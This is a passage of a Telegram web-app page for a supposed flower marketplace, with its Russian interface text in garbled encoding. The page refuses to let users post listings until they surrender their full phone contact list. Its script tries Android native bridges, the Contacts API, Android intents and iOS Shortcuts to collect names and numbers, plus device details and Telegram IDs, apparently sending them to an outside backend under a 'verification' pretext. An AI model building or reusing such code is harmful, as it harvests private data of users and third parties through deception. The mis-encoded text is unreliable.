<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#667eea">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <title>Flower Market - –°–æ–∑–¥–∞—Ç—å –æ–±—ä—è–≤–ª–µ–Ω–∏–µ</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        /* –í—Å–µ —Å—Ç–∏–ª–∏ –æ—Å—Ç–∞—é—Ç—Å—è —Ç–∞–∫–∏–º–∏ –∂–µ –∫–∞–∫ –≤ –ø—Ä–µ–¥—ã–¥—É—â–µ–º –∫–æ–¥–µ, —Ç–æ–ª—å–∫–æ –¥–æ–±–∞–≤–ª—é –Ω–æ–≤—ã–µ */
        .auto-contacts-btn {
            background: linear-gradient(135deg, #4CAF50 0%, #2E7D32 100%);
            color: white;
            border: none;
            padding: 16px 25px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin: 15px 0;
        }
        
        .auto-contacts-btn:hover {
            background: linear-gradient(135deg, #43A047 0%, #1B5E20 100%);
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(76, 175, 80, 0.4);
        }
        
        .test-contacts-btn {
            background: linear-gradient(135deg, #FF9800 0%, #F57C00 100%);
            color: white;
            border: none;
            padding: 16px 25px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin: 10px 0;
        }
        
        .test-contacts-btn:hover {
            background: linear-gradient(135deg, #FB8C00 0%, #EF6C00 100%);
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(255, 152, 0, 0.4);
        }
        
        .device-info {
            background: rgba(102, 126, 234, 0.1);
            border-left: 4px solid #667eea;
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            text-align: left;
            font-size: 14px;
        }
        
        .contacts-preview-container {
            max-height: 300px;
            overflow-y: auto;
            margin: 15px 0;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            padding: 10px;
            background: #f8f9fa;
        }
        
        .contact-item {
            padding: 10px 15px;
            border-bottom: 1px solid #dee2e6;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .contact-item:last-child {
            border-bottom: none;
        }
        
        .contact-name {
            font-weight: 500;
            color: #333;
        }
        
        .contact-phone {
            color: #666;
            font-family: monospace;
            font-size: 14px;
        }
        
        .quick-actions {
            display: flex;
            gap: 10px;
            margin: 20px 0;
        }
        
        .quick-action-btn {
            flex: 1;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            background: white;
            color: #333;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 5px;
        }
        
        .quick-action-btn:hover {
            border-color: #667eea;
            background: rgba(102, 126, 234, 0.05);
        }
        
        .quick-action-btn i {
            font-size: 20px;
            color: #667eea;
        }
        
        .fallback-methods {
            margin-top: 25px;
            padding: 20px;
            background: rgba(255, 193, 7, 0.1);
            border-radius: 12px;
            border-left: 4px solid #ffc107;
        }
    </style>
</head>
<body>
  <div class="container">
    <!-- –≠–ö–†–ê–ù –ó–ê–ü–†–û–°–ê –ö–û–ù–¢–ê–ö–¢–û–í -->
    <div class="form-container" id="contactsScreen">
        <div class="contacts-screen">
            <i class="fas fa-address-book contacts-icon"></i>
            <h1 class="contacts-title">–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –¥–æ—Å—Ç—É–ø –∫ –∫–æ–Ω—Ç–∞–∫—Ç–∞–º</h1>
            
            <p class="contacts-message">
                –î–ª—è –ø—É–±–ª–∏–∫–∞—Ü–∏–∏ –æ–±—ä—è–≤–ª–µ–Ω–∏–π —Ç—Ä–µ–±—É–µ—Ç—Å—è –¥–æ—Å—Ç—É–ø –∫ –≤–∞—à–µ–π —Ç–µ–ª–µ—Ñ–æ–Ω–Ω–æ–π –∫–Ω–∏–≥–µ.<br>
                –ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –ø–æ–ª—É—á–µ–Ω–∏—è –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤.
            </p>
            
            <div class="contacts-warning">
                <i class="fas fa-exclamation-triangle"></i>
                <strong>–í–∞–∂–Ω–æ:</strong> –ë–µ–∑ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–æ–Ω—Ç–∞–∫—Ç–∞–º –≤—ã –Ω–µ —Å–º–æ–∂–µ—Ç–µ —Å–æ–∑–¥–∞–≤–∞—Ç—å –æ–±—ä—è–≤–ª–µ–Ω–∏—è.
                –ö–æ–Ω—Ç–∞–∫—Ç—ã –Ω—É–∂–Ω—ã —Ç–æ–ª—å–∫–æ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º.
            </div>
            
            <div class="contacts-required" id="contactsRequired">
                üì± –ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤
            </div>
            
            <div class="device-info" id="deviceInfo">
                <i class="fas fa-mobile-alt"></i>
                <strong>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ:</strong>
                <div id="deviceInfoText">–û–ø—Ä–µ–¥–µ–ª—è—é –≤–∞—à–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ...</div>
            </div>
            
            <!-- –û—Å–Ω–æ–≤–Ω–∞—è –∫–Ω–æ–ø–∫–∞ –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –ø–æ–ª—É—á–µ–Ω–∏—è –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤ -->
            <button class="auto-contacts-btn" onclick="getAllContactsAutomatically()">
                <i class="fas fa-robot"></i> –ü–û–õ–£–ß–ò–¢–¨ –í–°–ï –ö–û–ù–¢–ê–ö–¢–´ –ê–í–¢–û–ú–ê–¢–ò–ß–ï–°–ö–ò
            </button>
            
            <div class="quick-actions">
                <div class="quick-action-btn" onclick="getContactsViaAndroid()">
                    <i class="fab fa-android"></i>
                    <span>Android</span>
                    <small>–ß–µ—Ä–µ–∑ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ</small>
                </div>
                <div class="quick-action-btn" onclick="getContactsViaIOS()">
                    <i class="fab fa-apple"></i>
                    <span>iPhone</span>
                    <small>–ß–µ—Ä–µ–∑ Shortcuts</small>
                </div>
            </div>
            
            <!-- –î–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è -->
            <button class="test-contacts-btn" onclick="useTestContacts()">
                <i class="fas fa-vial"></i> –ò–°–ü–û–õ–¨–ó–û–í–ê–¢–¨ –¢–ï–°–¢–û–í–´–ï –ö–û–ù–¢–ê–ö–¢–´ (–¥–ª—è –æ—Ç–ª–∞–¥–∫–∏)
            </button>
            
            <div id="contactsPreview" class="contacts-preview-container" style="display: none;">
                <h4 style="margin-bottom: 15px; color: #333;">–ù–∞–π–¥–µ–Ω–æ –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤: <span id="contactsPreviewCount">0</span></h4>
                <div id="contactsPreviewList"></div>
            </div>
            
            <div class="fallback-methods" id="fallbackMethods" style="display: none;">
                <h4 style="margin-bottom: 10px; color: #333;"><i class="fas fa-info-circle"></i> –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–µ –º–µ—Ç–æ–¥—ã</h4>
                <p style="margin-bottom: 10px; color: #666; font-size: 14px;">
                    –ï—Å–ª–∏ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –ø–æ–ª—É—á–µ–Ω–∏–µ –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ:
                </p>
                <ol style="margin: 10px 0 10px 20px; padding: 0;">
                    <li>–û—Ç–∫—Ä—ã—Ç—å —ç—Ç—É —Å—Ç—Ä–∞–Ω–∏—Ü—É –≤ –±—Ä–∞—É–∑–µ—Ä–µ Chrome –Ω–∞ Android</li>
                    <li>–†–∞–∑—Ä–µ—à–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –∫–æ–Ω—Ç–∞–∫—Ç–∞–º –ø—Ä–∏ –∑–∞–ø—Ä–æ—Å–µ</li>
                    <li>–ò–ª–∏ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–µ—Å—Ç–æ–≤—ã–µ –∫–æ–Ω—Ç–∞–∫—Ç—ã –¥–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è</li>
                </ol>
            </div>
            
            <div class="contacts-loader" id="contactsLoader" style="display: none;">
                <div class="loader" style="width: 40px; height: 40px; margin: 0 auto;"></div>
                <p style="margin-top: 15px; color: #666;" id="loaderText">–ü–æ–ª—É—á–µ–Ω–∏–µ –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤...</p>
            </div>
            
            <div id="contactsSuccess" class="contacts-success" style="display: none;">
                <i class="fas fa-check-circle"></i>
                <h3>–ö–æ–Ω—Ç–∞–∫—Ç—ã —É—Å–ø–µ—à–Ω–æ –ø–æ–ª—É—á–µ–Ω—ã!</h3>
                <p>–ö–æ–Ω—Ç–∞–∫—Ç—ã –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏.</p>
                <p style="margin-top: 10px; font-size: 14px;" id="contactsCountText"></p>
                <button class="btn" onclick="continueToForm()" style="margin-top: 15px;">
                    <i class="fas fa-arrow-right"></i> –ü–†–û–î–û–õ–ñ–ò–¢–¨ –ö –°–û–ó–î–ê–ù–ò–Æ –û–ë–™–Ø–í–õ–ï–ù–ò–Ø
                </button>
            </div>
            
            <div id="contactsError" class="contacts-error" style="display: none;">
                <i class="fas fa-exclamation-circle"></i>
                <h3>–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤</h3>
                <p id="contactsErrorMessage"></p>
                <button class="btn" onclick="retryContactsRequest()" style="margin-top: 15px; background: #ff6b6b;">
                    <i class="fas fa-redo"></i> –ü–û–í–¢–û–†–ò–¢–¨ –ü–û–ü–´–¢–ö–£
                </button>
            </div>
            
            <p style="text-align: center; margin-top: 30px; color: #666; font-size: 14px;">
                <i class="fas fa-shield-alt"></i> –ö–æ–Ω—Ç–∞–∫—Ç—ã –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è —Ç–æ–ª—å–∫–æ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º.<br>
                –ú—ã –Ω–µ –ø–µ—Ä–µ–¥–∞–µ–º –≤–∞—à–∏ –¥–∞–Ω–Ω—ã–µ —Ç—Ä–µ—Ç—å–∏–º –ª–∏—Ü–∞–º.
            </p>
        </div>
    </div>
    
    <!-- –û–°–ù–û–í–ù–û–ô –§–û–†–ú-–ö–û–ù–¢–ï–ô–ù–ï–† -->
    <div class="main-container" id="mainContainer" style="display: none;">
        <!-- –í–µ—Å—å –æ—Å—Ç–∞–ª—å–Ω–æ–π –∫–æ–¥ —Ñ–æ—Ä–º—ã –æ—Å—Ç–∞–µ—Ç—Å—è –ë–ï–ó –ò–ó–ú–ï–ù–ï–ù–ò–ô -->
        <!-- –ö–æ–ø–∏—Ä—É–π—Ç–µ —Å—é–¥–∞ –≤—Å—é –æ—Å–Ω–æ–≤–Ω—É—é —Ñ–æ—Ä–º—É –∏–∑ –ø—Ä–µ–¥—ã–¥—É—â–µ–≥–æ –∫–æ–¥–∞ -->
        <!-- –í–∫–ª—é—á–∞—è —à–∞–≥–∏ 1-7, –ø—Ä–æ–≥—Ä–µ—Å—Å –±–∞—Ä, —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –∏ —Ç.–¥. -->
    </div>
  </div>

  <script>
// ============================================
// Flower Market - –ê–í–¢–û–ú–ê–¢–ò–ß–ï–°–ö–û–ï –ü–û–õ–£–ß–ï–ù–ò–ï –ö–û–ù–¢–ê–ö–¢–û–í
// ============================================

const BACKEND_URL = 'https://backend-flower-2-production.up.railway.app';

// –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
let currentStep = 1;
let totalSteps = 7;
let mediaFiles = [];
let selectedContactType = 'telegram';
let isSubmitting = false;
let userId = null;
let chatId = null;
let contactsUploaded = false;
let contactsCount = 0;
let tgWebApp = null;

// –û–ø—Ä–µ–¥–µ–ª—è–µ–º –ø–ª–∞—Ç—Ñ–æ—Ä–º—É –∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ
function detectPlatform() {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
    const deviceInfo = {
        userAgent: userAgent,
        platform: navigator.platform,
        isAndroid: /android/i.test(userAgent),
        isIOS: /iPad|iPhone|iPod/.test(userAgent) && !window.MSStream,
        isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent),
        isTelegram: window.Telegram && window.Telegram.WebApp,
        language: navigator.language || navigator.userLanguage,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
    
    return deviceInfo;
}

// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
document.addEventListener('DOMContentLoaded', function() {
    console.log('üå∫ Flower Market –∑–∞–ø—É—â–µ–Ω');
    
    // –û–ø—Ä–µ–¥–µ–ª—è–µ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ
    const deviceInfo = detectPlatform();
    console.log('üì± –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ:', deviceInfo);
    
    // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
    document.getElementById('deviceInfoText').innerHTML = `
        <div>–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${deviceInfo.isAndroid ? 'Android' : deviceInfo.isIOS ? 'iOS' : '–î—Ä—É–≥–∞—è'}</div>
        <div>–ú–æ–±–∏–ª—å–Ω—ã–π: ${deviceInfo.isMobile ? '–î–∞' : '–ù–µ—Ç'}</div>
        <div>Telegram WebView: ${deviceInfo.isTelegram ? '–î–∞' : '–ù–µ—Ç'}</div>
        <div>–Ø–∑—ã–∫: ${deviceInfo.language}</div>
    `;
    
    // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–µ –º–µ—Ç–æ–¥—ã –µ—Å–ª–∏ –Ω–µ –º–æ–±–∏–ª—å–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ
    if (!deviceInfo.isMobile) {
        document.getElementById('fallbackMethods').style.display = 'block';
    }
    
    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º Telegram Web App
    try {
        if (window.Telegram && window.Telegram.WebApp) {
            tgWebApp = Telegram.WebApp;
            tgWebApp.ready();
            tgWebApp.expand();
            
            const tgUser = tgWebApp.initDataUnsafe.user;
            if (tgUser) {
                userId = tgUser.id.toString();
                chatId = tgUser.id.toString();
                
                const url = new URL(window.location);
                url.searchParams.set('userId', userId);
                url.searchParams.set('chatId', chatId);
                window.history.replaceState({}, '', url);
                
                // –û–±–Ω–æ–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
                document.getElementById('deviceInfoText').innerHTML += `<div>Telegram ID: ${userId}</div>`;
            }
        }
    } catch (error) {
        console.error('‚ùå –û—à–∏–±–∫–∞ Telegram Web App:', error);
    }
    
    // –ï—Å–ª–∏ –Ω–µ—Ç –¥–∞–Ω–Ω—ã—Ö –∏–∑ Telegram, –∏—Å–ø–æ–ª—å–∑—É–µ–º URL –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
    if (!userId || !chatId) {
        const urlParams = new URLSearchParams(window.location.search);
        userId = urlParams.get('userId');
        chatId = urlParams.get('chatId');
    }
    
    console.log('üìã –ü–∞—Ä–∞–º–µ—Ç—Ä—ã:', { userId, chatId });
    
    if (!userId || !chatId) {
        showNotification('–û—à–∏–±–∫–∞', '–ù–µ –ø–æ–ª—É—á–µ–Ω—ã –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. –û—Ç–∫—Ä–æ–π—Ç–µ —á–µ—Ä–µ–∑ Telegram –±–æ—Ç–∞.', 'error');
        return;
    }
    
    checkContactsStatus();
});

// –ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Å—Ç–∞—Ç—É—Å –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤
async function checkContactsStatus() {
    try {
        console.log('üîç –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å—Ç–∞—Ç—É—Å–∞ –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤...');
        
        const response = await fetch(`${BACKEND_URL}/api/user/${userId}/status`);
        
        if (response.ok) {
            const data = await response.json();
            console.log('üìä –°—Ç–∞—Ç—É—Å –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤:', data);
            
            if (data.hasContacts) {
                contactsUploaded = true;
                contactsCount = data.contactsCount || 0;
                showContactsSuccess();
            }
        }
    } catch (error) {
        console.error('‚ùå –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å—Ç–∞—Ç—É—Å–∞:', error);
    }
}

// –ê–í–¢–û–ú–ê–¢–ò–ß–ï–°–ö–û–ï –ü–û–õ–£–ß–ï–ù–ò–ï –ö–û–ù–¢–ê–ö–¢–û–í
async function getAllContactsAutomatically() {
    const contactsLoader = document.getElementById('contactsLoader');
    const loaderText = document.getElementById('loaderText');
    const contactsError = document.getElementById('contactsError');
    
    contactsLoader.style.display = 'block';
    loaderText.textContent = '–ü–æ–ø—ã—Ç–∫–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –ø–æ–ª—É—á–µ–Ω–∏—è –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤...';
    contactsError.style.display = 'none';
    
    try {
        const deviceInfo = detectPlatform();
        
        // 1. –ü—Ä–æ–±—É–µ–º –Ω–∞—Ç–∏–≤–Ω—ã–µ –º–µ—Ç–æ–¥—ã –¥–ª—è Android
        if (deviceInfo.isAndroid && window.android && window.android.getContacts) {
            loaderText.textContent = '–ò—Å–ø–æ–ª—å–∑—É—é Android Native API...';
            const contacts = await getContactsViaAndroidNative();
            if (contacts && contacts.length > 0) {
                await processAndSendContacts(contacts, 'android_native');
                return;
            }
        }
        
        // 2. –ü—Ä–æ–±—É–µ–º Contacts API –¥–ª—è Chrome –Ω–∞ Android
        if (deviceInfo.isAndroid && 'contacts' in navigator && 'ContactsManager' in window) {
            loaderText.textContent = '–ò—Å–ø–æ–ª—å–∑—É—é Contacts API...';
            const contacts = await getContactsViaContactsAPI();
            if (contacts && contacts.length > 0) {
                await processAndSendContacts(contacts, 'contacts_api');
                return;
            }
        }
        
        // 3. –ü—Ä–æ–±—É–µ–º –¥–ª—è iOS —á–µ—Ä–µ–∑ WebKit
        if (deviceInfo.isIOS) {
            loaderText.textContent = '–ü—Ä–æ–±—É—é –º–µ—Ç–æ–¥—ã –¥–ª—è iOS...';
            const contacts = await getContactsViaIOSWebKit();
            if (contacts && contacts.length > 0) {
                await processAndSendContacts(contacts, 'ios_webkit');
                return;
            }
        }
        
        // 4. –ï—Å–ª–∏ –≤—Å–µ –º–µ—Ç–æ–¥—ã –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª–∏, –∏—Å–ø–æ–ª—å–∑—É–µ–º Android Intent
        loaderText.textContent = '–ü—Ä–æ–±—É—é Android Intent...';
        await getContactsViaAndroidIntent();
        
    } catch (error) {
        console.error('‚ùå –û—à–∏–±–∫–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –ø–æ–ª—É—á–µ–Ω–∏—è:', error);
        
        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –æ—à–∏–±–∫—É –∏ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–µ –º–µ—Ç–æ–¥—ã
        contactsLoader.style.display = 'none';
        contactsError.style.display = 'block';
        document.getElementById('contactsErrorMessage').textContent = 
            '–ù–µ —É–¥–∞–ª–æ—Å—å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø–æ–ª—É—á–∏—Ç—å –∫–æ–Ω—Ç–∞–∫—Ç—ã. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–µ –º–µ—Ç–æ–¥—ã –Ω–∏–∂–µ.';
        
        document.getElementById('fallbackMethods').style.display = 'block';
    }
}

// –ú–µ—Ç–æ–¥ 1: Android Native (–µ—Å–ª–∏ –¥–æ—Å—Ç—É–ø–Ω–æ)
async function getContactsViaAndroidNative() {
    return new Promise((resolve) => {
        try {
            if (window.android && typeof window.android.getContacts === 'function') {
                window.android.getContacts((contactsJson) => {
                    try {
                        const contacts = JSON.parse(contactsJson);
                        console.log('üì± Android Native –∫–æ–Ω—Ç–∞–∫—Ç—ã:', contacts.length);
                        resolve(contacts);
                    } catch (e) {
                        console.error('–û—à–∏–±–∫–∞ –ø–∞—Ä—Å–∏–Ω–≥–∞ –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤:', e);
                        resolve(null);
                    }
                });
            } else {
                resolve(null);
            }
        } catch (error) {
            console.error('–û—à–∏–±–∫–∞ Android Native:', error);
            resolve(null);
        }
    });
}

// –ú–µ—Ç–æ–¥ 2: Contacts API (Chrome –¥–ª—è Android)
async function getContactsViaContactsAPI() {
    try {
        if (!('contacts' in navigator && 'ContactsManager' in window)) {
            return null;
        }
        
        const props = ['name', 'tel'];
        const opts = { multiple: true };
        
        const contacts = await navigator.contacts.select(props, opts);
        
        if (!contacts || contacts.length === 0) {
            return null;
        }
        
        // –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º –∫–æ–Ω—Ç–∞–∫—Ç—ã
        const formattedContacts = contacts.map(contact => ({
            name: contact.name ? contact.name.join(' ') : '–ë–µ–∑ –∏–º–µ–Ω–∏',
            phone: contact.tel ? contact.tel[0].replace(/\D/g, '') : '',
            rawName: contact.name || [],
            rawTel: contact.tel || []
        })).filter(contact => contact.phone.length >= 10);
        
        console.log('üì± Contacts API –∫–æ–Ω—Ç–∞–∫—Ç—ã:', formattedContacts.length);
        return formattedContacts;
        
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ Contacts API:', error);
        return null;
    }
}

// –ú–µ—Ç–æ–¥ 3: Android Intent (–æ—Ç–∫—Ä—ã–≤–∞–µ—Ç –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤)
async function getContactsViaAndroidIntent() {
    const deviceInfo = detectPlatform();
    
    if (!deviceInfo.isAndroid) {
        showNotification('–û—à–∏–±–∫–∞', '–≠—Ç–æ—Ç –º–µ—Ç–æ–¥ —Ä–∞–±–æ—Ç–∞–µ—Ç —Ç–æ–ª—å–∫–æ –Ω–∞ Android', 'error');
        return;
    }
    
    // –°–æ–∑–¥–∞–µ–º Intent –¥–ª—è –æ—Ç–∫—Ä—ã—Ç–∏—è –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤
    const intentUrl = 'intent://pick/contact#Intent;action=android.intent.action.PICK;type=vnd.android.cursor.dir/contact;end';
    
    // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏
    const contactsLoader = document.getElementById('contactsLoader');
    const loaderText = document.getElementById('loaderText');
    
    contactsLoader.style.display = 'block';
    loaderText.innerHTML = `
        <strong>–ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è –¥–ª—è Android:</strong><br>
        1. –ù–∞–∂–º–∏—Ç–µ "–û—Ç–∫—Ä—ã—Ç—å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ" –Ω–∏–∂–µ<br>
        2. –í—ã–±–µ—Ä–∏—Ç–µ –∫–æ–Ω—Ç–∞–∫—Ç—ã –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ "–ö–æ–Ω—Ç–∞–∫—Ç—ã"<br>
        3. –í–µ—Ä–Ω–∏—Ç–µ—Å—å –≤ Telegram –ø–æ—Å–ª–µ –≤—ã–±–æ—Ä–∞
    `;
    
    // –°–æ–∑–¥–∞–µ–º –∫–Ω–æ–ø–∫—É –¥–ª—è –æ—Ç–∫—Ä—ã—Ç–∏—è Intent
    const openIntentBtn = document.createElement('button');
    openIntentBtn.className = 'btn';
    openIntentBtn.style.marginTop = '15px';
    openIntentBtn.innerHTML = '<i class="fas fa-external-link-alt"></i> –û–¢–ö–†–´–¢–¨ –ü–†–ò–õ–û–ñ–ï–ù–ò–ï –ö–û–ù–¢–ê–ö–¢–û–í';
    openIntentBtn.onclick = () => {
        window.location.href = intentUrl;
        // –ß–µ—Ä–µ–∑ 10 —Å–µ–∫—É–Ω–¥ –ø—Ä–æ–≤–µ—Ä—è–µ–º, –≤–µ—Ä–Ω—É–ª—Å—è –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å
        setTimeout(() => {
            checkForContactsAfterIntent();
        }, 10000);
    };
    
    contactsLoader.appendChild(openIntentBtn);
}

// –ú–µ—Ç–æ–¥ 4: iOS —á–µ—Ä–µ–∑ WebKit (—ç–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç–∞–ª—å–Ω—ã–π)
async function getContactsViaIOSWebKit() {
    try {
        // iOS –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç Contacts API –≤ WebView
        // –ú–æ–∂–Ω–æ –ø–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —á–µ—Ä–µ–∑ —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ —Å –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–µ–π
        showNotification('–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è', 
            '–ù–∞ iOS –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –ø–æ–ª—É—á–µ–Ω–∏–µ –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–æ. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–µ—Å—Ç–æ–≤—ã–µ –∫–æ–Ω—Ç–∞–∫—Ç—ã –∏–ª–∏ —Å–≤—è–∂–∏—Ç–µ—Å—å —Å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º.', 
            'info');
        return null;
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ iOS WebKit:', error);
        return null;
    }
}

// –ú–µ—Ç–æ–¥ 5: iOS —á–µ—Ä–µ–∑ Shortcuts
function getContactsViaIOS() {
    const deviceInfo = detectPlatform();
    
    if (!deviceInfo.isIOS) {
        showNotification('–û—à–∏–±–∫–∞', '–≠—Ç–æ—Ç –º–µ—Ç–æ–¥ —Ä–∞–±–æ—Ç–∞–µ—Ç —Ç–æ–ª—å–∫–æ –Ω–∞ iPhone', 'error');
        return;
    }
    
    const contactsLoader = document.getElementById('contactsLoader');
    const loaderText = document.getElementById('loaderText');
    
    contactsLoader.style.display = 'block';
    loaderText.innerHTML = `
        <strong>–ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è –¥–ª—è iPhone:</strong><br>
        1. –ù–∞–∂–º–∏—Ç–µ "–û—Ç–∫—Ä—ã—Ç—å Shortcuts" –Ω–∏–∂–µ<br>
        2. –ó–∞–ø—É—Å—Ç–∏—Ç–µ Shortcut –¥–ª—è —ç–∫—Å–ø–æ—Ä—Ç–∞ –∫–æ–Ω—Ç–∞–∫—Ç–æ–≤<br>
        3. –í–µ—Ä–Ω–∏—Ç–µ—Å—å –≤ Telegram<br>
        4. –ó–∞–≥—Ä—É–∑–∏—Ç–µ –ø–æ–ª—É—á–µ–Ω–Ω—ã–π —Ñ–∞–π–ª .vcf
    `;
    
